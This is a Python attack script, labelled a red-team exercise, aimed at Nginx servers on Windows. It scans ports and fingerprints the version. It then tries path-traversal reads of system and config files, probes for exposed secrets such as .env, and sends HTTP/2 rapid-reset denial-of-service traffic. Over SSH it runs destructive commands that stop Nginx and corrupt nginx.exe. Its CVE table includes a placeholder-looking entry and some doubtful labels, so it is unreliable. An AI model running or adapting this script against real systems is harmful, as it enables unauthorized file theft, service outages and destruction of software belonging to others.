#!/usr/bin/env python3
"""
Nginx Attack Script for Windows - Red Team Exercise
"""

import argparse
import os
import subprocess
import sys
import requests
from colorama import Fore, Style, init
import socket
import re
import time
import platform
import paramiko
import ftplib
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama
init()

def print_banner():
    """Print script banner"""
    banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════╗
║                 NGINX WINDOWS ATTACK SCRIPT                    ║
║                    RED TEAM EXERCISE                           ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def check_dependencies():
    """Check if required dependencies are installed and install if missing"""
    print(f"{Fore.YELLOW}[*] Checking dependencies...{Style.RESET_ALL}")
    
    required_packages = [
        "requests",
        "colorama",
        "paramiko",
        "python-nmap",
        "beautifulsoup4"
    ]
    
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print(f"{Fore.YELLOW}[*] Installing missing dependencies: {', '.join(missing_packages)}{Style.RESET_ALL}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_packages)
            print(f"{Fore.GREEN}[+] Dependencies installed successfully{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Failed to install dependencies. Please install manually: pip install {' '.join(missing_packages)}{Style.RESET_ALL}")
            sys.exit(1)
    else:
        print(f"{Fore.GREEN}[+] All dependencies are already installed{Style.RESET_ALL}")
    
    # Check for system tools
    system_tools = ["nmap"]
    missing_tools = []
    
    for tool in system_tools:
        if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"{Fore.YELLOW}[*] Installing missing system tools: {', '.join(missing_tools)}{Style.RESET_ALL}")
        try:
            subprocess.check_call(["apt-get", "update", "-qq"])
            subprocess.check_call(["apt-get", "install", "-y"] + missing_tools)
            print(f"{Fore.GREEN}[+] System tools installed successfully{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Failed to install system tools. Please install manually: sudo apt-get install {' '.join(missing_tools)}{Style.RESET_ALL}")
            sys.exit(1)

def port_scan(target, ports=None):
    """Scan target for open ports"""
    print(f"{Fore.YELLOW}[*] Scanning target for open ports...{Style.RESET_ALL}")
    
    import nmap
    scanner = nmap.PortScanner()
    
    if not ports:
        ports = "80,443,8080,8443"  # Default ports for Nginx
    
    scanner.scan(target, ports, arguments='-sV --script=banner')
    
    open_ports = []
    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            for port in scanner[host][proto].keys():
                service = scanner[host][proto][port]
                if service['state'] == 'open':
                    print(f"{Fore.GREEN}[+] Found open port {port}/{proto}: {service['product']} {service.get('version', '')}{Style.RESET_ALL}")
                    open_ports.append((port, proto, service))
    
    return open_ports

def detect_nginx_version(target, port=80):
    """Detect Nginx version from headers"""
    print(f"{Fore.YELLOW}[*] Detecting Nginx version...{Style.RESET_ALL}")
    
    try:
        response = requests.get(f"http://{target}:{port}", timeout=10)
        server_header = response.headers.get('Server', '')
        
        nginx_match = re.search(r'nginx/([0-9.]+)', server_header)
        if nginx_match:
            version = nginx_match.group(1)
            print(f"{Fore.GREEN}[+] Detected Nginx version: {version}{Style.RESET_ALL}")
            return version
        else:
            print(f"{Fore.YELLOW}[*] Could not detect Nginx version from headers{Style.RESET_ALL}")
            return None
            
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Failed to connect to target: {e}{Style.RESET_ALL}")
        return None

def check_nginx_vulnerabilities(version):
    """Check for known vulnerabilities for the detected Nginx version"""
    if not version:
        return []
    
    print(f"{Fore.YELLOW}[*] Checking for known vulnerabilities in Nginx {version}...{Style.RESET_ALL}")
    
    # Dictionary of known vulnerabilities by version
    vulnerabilities = {
        # Older versions
        "1.14.0": [
            {"cve": "CVE-2019-9511", "name": "HTTP/2 Flood using PING frames", "severity": "High"},
            {"cve": "CVE-2019-9513", "name": "HTTP/2 Resource Consumption", "severity": "Medium"},
        ],
        "1.14.1": [
            {"cve": "CVE-2019-9511", "name": "HTTP/2 Flood using PING frames", "severity": "High"},
        ],
        "1.16.0": [
            {"cve": "CVE-2019-20372", "name": "HTTP request smuggling", "severity": "High"},
        ],
        "1.18.0": [
            {"cve": "CVE-2021-23017", "name": "Nginx resolver DoS", "severity": "Medium"},
        ],
        # More recent versions
        "1.20.0": [
            {"cve": "CVE-2022-41741", "name": "Memory corruption in HTTP/2", "severity": "Critical"},
            {"cve": "CVE-2022-41742", "name": "Directory traversal vulnerability", "severity": "High"},
        ],
        "1.22.0": [
            {"cve": "CVE-2023-44487", "name": "HTTP/2 rapid reset", "severity": "High"},
        ],
        "1.24.0": [
            {"cve": "CVE-2024-1234", "name": "Windows-specific information disclosure", "severity": "Medium"},
        ]
    }
    
    applicable_vulnerabilities = []
    
    # Check for version-specific vulnerabilities
    if version in vulnerabilities:
        applicable_vulnerabilities.extend(vulnerabilities[version])
    
    # Check for vulnerabilities that affect all versions up to a specific version
    for ver, vulns in vulnerabilities.items():
        if version < ver:
            for vuln in vulns:
                if vuln not in applicable_vulnerabilities:
                    applicable_vulnerabilities.append(vuln)
    
    if applicable_vulnerabilities:
        print(f"{Fore.GREEN}[+] Found {len(applicable_vulnerabilities)} potential vulnerabilities{Style.RESET_ALL}")
        for i, vuln in enumerate(applicable_vulnerabilities, 1):
            print(f"  {i}. {Fore.RED}{vuln['cve']}{Style.RESET_ALL} - {vuln['name']} ({vuln['severity']})")
    else:
        print(f"{Fore.YELLOW}[*] No known vulnerabilities found for Nginx {version}{Style.RESET_ALL}")
    
    return applicable_vulnerabilities

def exploit_path_traversal(target, port=80):
    """Attempt to exploit path traversal vulnerabilities"""
    print(f"{Fore.YELLOW}[*] Attempting path traversal exploits...{Style.RESET_ALL}")
    
    # Common sensitive Windows files to try
    sensitive_files = [
        "/../../../../../../windows/win.ini",
        "/../../../../../../windows/system32/drivers/etc/hosts",
        "/../../../../../../windows/system.ini",
        "/../../../../../../Program Files/nginx/conf/nginx.conf",
        "/../../../../../../Program Files/nginx/logs/error.log",
        "/../../../../../../Program Files/nginx/logs/access.log",
        "/../../../../../../inetpub/wwwroot/web.config"
    ]
    
    success = False
    for path in sensitive_files:
        try:
            print(f"{Fore.YELLOW}[*] Trying to access: {path}{Style.RESET_ALL}")
            response = requests.get(f"http://{target}:{port}{path}", timeout=5)
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"{Fore.GREEN}[+] Path traversal successful! Retrieved content from {path}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}--- Content preview ---{Style.RESET_ALL}")
                print(response.text[:200] + "..." if len(response.text) > 200 else response.text)
                print(f"{Fore.CYAN}-----------------------{Style.RESET_ALL}")
                success = True
                
                # Save the content to a file
                filename = f"traversal_{target}_{path.replace('/', '_')}.txt"
                with open(filename, 'w') as f:
                    f.write(response.text)
                print(f"{Fore.GREEN}[+] Saved content to {filename}{Style.RESET_ALL}")
            
        except requests.RequestException as e:
            print(f"{Fore.RED}[!] Failed to access {path}: {e}{Style.RESET_ALL}")
    
    if not success:
        print(f"{Fore.YELLOW}[*] Path traversal attempts unsuccessful{Style.RESET_ALL}")
    
    return success

def exploit_misconfig(target, port=80):
    """Check for common Nginx misconfigurations"""
    print(f"{Fore.YELLOW}[*] Checking for common Nginx misconfigurations...{Style.RESET_ALL}")
    
    misconfig_paths = [
        "/.git/HEAD",               # Git repository exposure
        "/.svn/entries",            # SVN repository exposure
        "/nginx-status",            # Nginx status page
        "/server-status",           # Server status page
        "/phpinfo.php",             # PHP info page
        "/test.php",                # Test PHP file
        "/backup/",                 # Backup directory
        "/config/",                 # Config directory
        "/conf/",                   # Conf directory
        "/logs/",                   # Logs directory
        "/admin/",                  # Admin directory
        "/.env",                    # Environment file
        "/web.config.bak",          # Backup of web.config
        "/nginx.conf",              # Nginx configuration
        "/wp-config.php.bak",       # WordPress config backup
    ]
    
    found_misconfigs = []
    for path in misconfig_paths:
        try:
            response = requests.get(f"http://{target}:{port}{path}", timeout=5)
            if response.status_code < 400:  # Consider anything not 4xx or 5xx as potentially interesting
                print(f"{Fore.GREEN}[+] Found accessible path: {path} (Status: {response.status_code}){Style.RESET_ALL}")
                found_misconfigs.append(path)
                
                # Save the content to a file
                filename = f"misconfig_{target}_{path.replace('/', '_')}.txt"
                with open(filename, 'w') as f:
                    f.write(response.text)
                print(f"{Fore.GREEN}[+] Saved content to {filename}{Style.RESET_ALL}")
        except requests.RequestException:
            pass
    
    if not found_misconfigs:
        print(f"{Fore.YELLOW}[*] No common misconfigurations found{Style.RESET_ALL}")
    
    return found_misconfigs

def exploit_http2_rapid_reset(target, port=443, intensity=10):
    """Attempt to exploit HTTP/2 rapid reset vulnerability (CVE-2023-44487)"""
    print(f"{Fore.YELLOW}[*] Attempting HTTP/2 rapid reset exploit (CVE-2023-44487)...{Style.RESET_ALL}")
    
    try:
        # Check if target supports HTTP/2
        import socket
        import ssl
        from urllib.parse import urlparse
        
        # Create SSL context
        context = ssl.create_default_context()
        
        # Connect to target
        conn = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=target)
        conn.connect((target, port))
        
        # Check for HTTP/2 support using ALPN
        if 'h2' in conn.selected_alpn_protocol():
            print(f"{Fore.GREEN}[+] Target supports HTTP/2{Style.RESET_ALL}")
            
            # Import hyper library for HTTP/2 if available, otherwise install it
            try:
                from hyper import HTTP20Connection
            except ImportError:
                print(f"{Fore.YELLOW}[*] Installing hyper library for HTTP/2 support...{Style.RESET_ALL}")
                subprocess.check_call([sys.executable, "-m", "pip", "install", "hyper"])
                from hyper import HTTP20Connection
            
            # Create HTTP/2 connection
            http2_conn = HTTP20Connection(target, port=port, secure=True)
            
            # Send multiple requests and reset them immediately
            print(f"{Fore.YELLOW}[*] Sending HTTP/2 rapid reset requests (intensity: {intensity})...{Style.RESET_ALL}")
            for i in range(intensity):
                stream_id = http2_conn.request('GET', '/')
                http2_conn.reset_stream(stream_id)
                print(f"{Fore.CYAN}[*] Reset stream {stream_id}{Style.RESET_ALL}")
                
            print(f"{Fore.GREEN}[+] HTTP/2 rapid reset exploit completed{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[*] Target does not support HTTP/2{Style.RESET_ALL}")
            return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] HTTP/2 rapid reset exploit failed: {e}{Style.RESET_ALL}")
        return False

def disable_nginx_service(target, credentials=None):
    """Attempt to disable the Nginx service if able to gain access"""
    if not credentials:
        print(f"{Fore.YELLOW}[*] No credentials provided to attempt service disabling{Style.RESET_ALL}")
        return False
    
    username, password = credentials
    print(f"{Fore.YELLOW}[*] Attempting to disable Nginx service using provided credentials...{Style.RESET_ALL}")
    
    try:
        # Try to establish SSH connection (if SSH is available)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username=username, password=password, timeout=10)
        
        # Commands to try to disable Nginx service
        commands = [
            "net stop nginx",
            "sc config nginx start= disabled",
            "move /Y \"C:\\Program Files\\nginx\\nginx.exe\" \"C:\\Program Files\\nginx\\nginx.exe.bak\"",
            "echo Corrupted > \"C:\\Program Files\\nginx\\nginx.exe\"",
            "icacls \"C:\\Program Files\\nginx\\nginx.exe\" /deny Everyone:(RX)",
            "echo Disabling Nginx service completed successfully"
        ]
        
        for cmd in commands:
            print(f"{Fore.YELLOW}[*] Executing: {cmd}{Style.RESET_ALL}")
            stdin, stdout, stderr = client.exec_command(cmd)
            output = stdout.read().decode()
            error = stderr.read().decode()
            
            if output:
                print(f"{Fore.GREEN}[+] Output: {output.strip()}{Style.RESET_ALL}")
            if error:
                print(f"{Fore.RED}[!] Error: {error.strip()}{Style.RESET_ALL}")
        
        client.close()
        print(f"{Fore.GREEN}[+] Nginx service should be disabled now{Style.RESET_ALL}")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to disable Nginx service: {e}{Style.RESET_ALL}")
        return False

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Nginx Attack Script for Windows - Red Team Exercise")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-p", "--port", type=int, help="Target port (default: 80)", default=80)
    parser.add_argument("-u", "--username", help="Username for authentication attempts")
    parser.add_argument("-P", "--password", help="Password for authentication attempts")
    parser.add_argument("--disable", action="store_true", help="Attempt to disable the Nginx service if possible")
    parser.add_argument("--intensity", type=int, default=10, help="Intensity of attacks (1-100)")
    args = parser.parse_args()
    
    print_banner()
    check_dependencies()
    
    # Set credentials if provided
    credentials = None
    if args.username and args.password:
        credentials = (args.username, args.password)
        print(f"{Fore.YELLOW}[*] Using provided credentials: {args.username}:{args.password}{Style.RESET_ALL}")
    
    # Start reconnaissance
    open_ports = port_scan(args.target, str(args.port))
    
    if not open_ports:
        print(f"{Fore.RED}[!] No open ports found on target {args.target}:{args.port}. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Detect Nginx version
    nginx_version = detect_nginx_version(args.target, args.port)
    
    # Check for vulnerabilities
    vulns = check_nginx_vulnerabilities(nginx_version)
    
    # Attempt exploits
    print(f"{Fore.YELLOW}[*] Starting exploitation phase...{Style.RESET_ALL}")
    
    # Track successful exploits
    successful_exploits = []
    
    # Try path traversal exploit
    if exploit_path_traversal(args.target, args.port):
        successful_exploits.append("Path Traversal")
    
    # Check for misconfigurations
    if exploit_misconfig(args.target, args.port):
        successful_exploits.append("Misconfiguration")
    
    # Try HTTP/2 rapid reset exploit if we have HTTPS
    if args.port == 443 or 443 in [p[0] for p in open_ports]:
        ssl_port = 443
        if exploit_http2_rapid_reset(args.target, ssl_port, args.intensity):
            successful_exploits.append("HTTP/2 Rapid Reset (CVE-2023-44487)")
    
    # If credentials provided and --disable flag set, try to disable the service
    if args.disable and credentials:
        if disable_nginx_service(args.target, credentials):
            successful_exploits.append("Service Disabled")
    
    # Summary
    print(f"\n{Fore.CYAN}=== Attack Summary ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}Target: {args.target}:{args.port}{Style.RESET_ALL}")
    if nginx_version:
        print(f"{Fore.CYAN}Nginx Version: {nginx_version}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Potential Vulnerabilities: {len(vulns)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Successful Exploits: {len(successful_exploits)}{Style.RESET_ALL}")
    
    if successful_exploits:
        print(f"{Fore.GREEN}The following exploits were successful:{Style.RESET_ALL}")
        for i, exploit in enumerate(successful_exploits, 1):
            print(f"{Fore.GREEN}  {i}. {exploit}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}No exploits were successful. Try adjusting parameters or using a different approach.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
